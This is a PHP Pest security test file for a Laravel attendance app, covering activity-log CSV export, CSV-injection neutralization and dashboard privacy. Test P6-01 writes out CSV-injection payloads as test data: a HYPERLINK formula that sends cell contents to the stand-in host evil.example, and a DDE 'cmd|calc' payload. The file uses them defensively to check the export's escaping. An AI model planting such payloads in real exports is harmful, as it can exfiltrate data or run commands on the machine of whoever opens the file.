<?php

// Phase 6 security checks (dashboards, activity log CSV export). LOCAL ONLY, frozen clock.
// Run on a private database (never attendance_e2e):
//   DB_DATABASE=attendance_sec6 vendor/bin/pest tests/security/Phase6SecurityTest.php
// A FAIL here is a finding of docs/reports/phase-6-security.md (test name carries the ID).

use App\Enums\LogLevel;
use App\Enums\LogType;
use App\Enums\Permission;
use App\Enums\UserStatus;
use App\Http\Controllers\Admin\ActivityLogController;
use App\Models\ActivityLog;
use App\Models\Client;
use App\Models\Leave;
use App\Models\User;
use App\Models\WorkSchedule;
use App\Settings\SettingsService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

uses(TestCase::class, RefreshDatabase::class);

require_once __DIR__.'/../Support/attendance.php';

function sec6Log(array $attrs = []): ActivityLog
{
    return ActivityLog::query()->create($attrs + ['type' => LogType::Action->value, 'level' => LogLevel::Info->value, 'event' => 'test.event', 'description' => 'd']);
}

/** @return list<list<string>> */
function sec6Csv(string $body, string $sep = ','): array
{
    $body = preg_replace('/^\xEF\xBB\xBF/', '', $body);
    $rows = [];
    $h = fopen('php://memory', 'r+');
    fwrite($h, $body);
    rewind($h);
    while (($r = fgetcsv($h, null, $sep, '"', '')) !== false) {
        $rows[] = $r;
    }

    return $rows;
}

beforeEach(function () {
    at('2026-11-18 10:00');
    $this->sa = User::factory()->superAdmin()->create();
});

describe('CSV export authorization and limits', function () {
    it('is refused to employees, view_logs admins and guests', function () {
        Sanctum::actingAs(User::factory()->create(['created_at' => Carbon::parse('2026-01-01')]));
        $this->get('/api/admin/activity-logs/export')->assertForbidden();
        Sanctum::actingAs(User::factory()->admin(Permission::ViewLogs)->create());
        $this->get('/api/admin/activity-logs/export')->assertForbidden();
        Sanctum::actingAs(User::factory()->admin(...Permission::cases())->create());
        $this->get('/api/admin/activity-logs/export')->assertForbidden();
    });

    it('caps rows, applies filters and logs the export', function () {
        app(SettingsService::class)->set(['log_export_max_rows' => 100]);
        for ($i = 0; $i < 150; $i++) {
            sec6Log(['event' => $i % 2 ? 'a.one' : 'b.two']);
        }
        Sanctum::actingAs($this->sa);
        $rows = sec6Csv($this->get('/api/admin/activity-logs/export')->assertOk()->streamedContent());
        expect(count($rows) - 1)->toBe(100);
        $rows = sec6Csv($this->get('/api/admin/activity-logs/export?event=a.one')->assertOk()->streamedContent());
        expect(count($rows) - 1)->toBe(75)->and(collect($rows)->skip(1)->pluck(3)->unique()->all())->toBe(['a.one']);
        $log = ActivityLog::query()->where('event', 'logs.exported')->latest('id')->first();
        expect($log)->not->toBeNull()->and($log->context['filters'])->toBe(['event' => 'a.one']);
        $this->get('/api/admin/activity-logs/export?event=a%25')->assertStatus(422);
        $this->get('/api/admin/activity-logs/export?from=2026-13-01')->assertStatus(422);
    });

    it('applies the hourly limit', function () {
        app(SettingsService::class)->set(['log_export_per_hour' => 2]);
        Sanctum::actingAs($this->sa);
        $this->get('/api/admin/activity-logs/export')->assertOk();
        $this->get('/api/admin/activity-logs/export')->assertOk();
        $this->get('/api/admin/activity-logs/export')->assertStatus(429);
    });
});

describe('CSV injection', function () {
    it('neutralizes the classic prefixes', function (string $v) {
        expect(ActivityLogController::cell($v))->toStartWith("'");
    })->with(['=1+1', '+1', '-1', '@SUM(A1)', "\t=1", "\r=1"]);

    it('P6-01 no cell starts a formula when the file is opened with a semicolon separator', function () {
        // User agent and device id are attacker-controlled and stored in failed-login logs.
        sec6Log(['user_agent' => 'Mozilla;=HYPERLINK("http://evil.example/?"&A1;"x")', 'description' => 'Failed sign-in for x;-2+3+cmd|calc!A0']);
        Sanctum::actingAs($this->sa);
        $body = $this->get('/api/admin/activity-logs/export?event=test.event')->assertOk()->streamedContent();
        $bad = collect(sec6Csv($body, ';'))->flatten()->filter(fn ($c) => $c !== '' && in_array($c[0], ['=', '+', '-', '@'], true))->values()->all();
        expect($bad)->toBe([]);
    });

    it('P6-02 leading whitespace and unicode lookalikes are neutralized (hardening applied)', function () {
        expect(ActivityLogController::cell(' =1+1'))->toBe("' =1+1")
            ->and(ActivityLogController::cell("\u{FF1D}1+1"))->toBe("'=1+1")
            ->and(ActivityLogController::cell("\n=1+1"))->toBe("'\n=1+1");
    });
});

describe('CSV streaming', function () {
    it('P6-03 export is consistent when logs are written during the export (no duplicate rows)', function () {
        for ($i = 0; $i < 1200; $i++) {
            sec6Log(['description' => "row {$i}"]);
        }
        $inserted = false;
        $offsetQueries = 0;
        DB::listen(function ($q) use (&$inserted, &$offsetQueries) {
            if (str_contains($q->sql, 'from "activity_logs"') && str_contains($q->sql, 'limit')) {
                $offsetQueries++;
                if (! $inserted) {
                    $inserted = true;
                    // a new log arrives while the first chunk is being written (e.g. a sign-in)
                    DB::table('activity_logs')->insert(['type' => 'action', 'level' => 'info', 'event' => 'test.event', 'description' => 'concurrent', 'created_at' => now()->addSecond()]);
                }
            }
        });
        Sanctum::actingAs($this->sa);
        $rows = collect(sec6Csv($this->get('/api/admin/activity-logs/export?event=test.event')->assertOk()->streamedContent()))->skip(1);
        $descs = $rows->pluck(4);
        expect($offsetQueries)->toBeGreaterThan(0)
            ->and($descs->count())->toBe($descs->unique()->count());
    });
});

describe('dashboards', function () {
    beforeEach(function () {
        $c = Carbon::parse('2026-01-01');
        $this->a = User::factory()->create(['created_at' => $c]);
        $this->b = User::factory()->create(['created_at' => $c]);
        attend($this->a, '2026-11-18', late: true);
        attend($this->b, '2026-11-17', late: true);
        Client::query()->create(['user_id' => $this->b->id, 'work_date' => '2026-11-17', 'name' => 'Secret client', 'service' => 'Visa', 'service_key' => 'visa', 'quantity' => 1]);
    });

    it('employee dashboard contains only the caller figures', function () {
        Sanctum::actingAs($this->a);
        $d = $this->getJson('/api/me/dashboard?user_id='.$this->b->id)->assertOk()->json('data');
        expect($d['week']['late_count'])->toBe(1)->and($d['week']['clients_count'])->toBe(0)
            ->and(json_encode($d))->not->toContain('Secret client');
    });

    it('admin dashboard never returns names or ids of employees', function () {
        Sanctum::actingAs($this->sa);
        $body = $this->getJson('/api/admin/dashboard')->assertOk()->getContent();
        expect($body)->not->toContain('Secret client')->not->toContain($this->a->email)->not->toContain($this->a->last_name);
    });

    it('P6-04 checked_in counts only employees counted in expected (no blocked / not-yet-member leak)', function () {
        $blocked = User::factory()->status(UserStatus::Blocked)->create(['created_at' => Carbon::parse('2026-01-01')]);
        attend($blocked, '2026-11-18');
        $onLeave = User::factory()->create(['created_at' => Carbon::parse('2026-01-01')]);
        Leave::query()->create(['user_id' => $onLeave->id, 'start_date' => '2026-11-18', 'end_date' => '2026-11-18']);
        Sanctum::actingAs(User::factory()->admin(Permission::ViewActivities)->create());
        $t = $this->getJson('/api/admin/dashboard')->json('data.today');
        // expected = a, b ; checked in among them = a. Blocked account checked in must not appear.
        expect($t['expected'])->toBe(2)->and($t['checked_in'] + $t['missing'])->toBe($t['expected']);
    });

    it('P6-05 admin dashboard query count does not grow with the number of employees', function () {
        $count = function () {
            DB::flushQueryLog();
            DB::enableQueryLog();
            $this->getJson('/api/admin/dashboard')->assertOk();
            $n = count(DB::getQueryLog());
            DB::disableQueryLog();

            return $n;
        };
        Sanctum::actingAs($this->sa);
        $small = $count();
        foreach (User::factory()->count(60)->create(['created_at' => Carbon::parse('2026-01-01')]) as $i => $u) {
            if ($i % 3 === 0) {
                WorkSchedule::query()->create(['user_id' => $u->id, 'effective_from' => '2026-01-01', 'days_off' => [], 'remote_days' => [3]]);
            }
        }
        $big = $count();
        fwrite(STDERR, "\n[P6-05] admin dashboard queries: 2 employees={$small}, 62 employees={$big}\n");
        expect($big - $small)->toBeLessThan(10);
    });
});
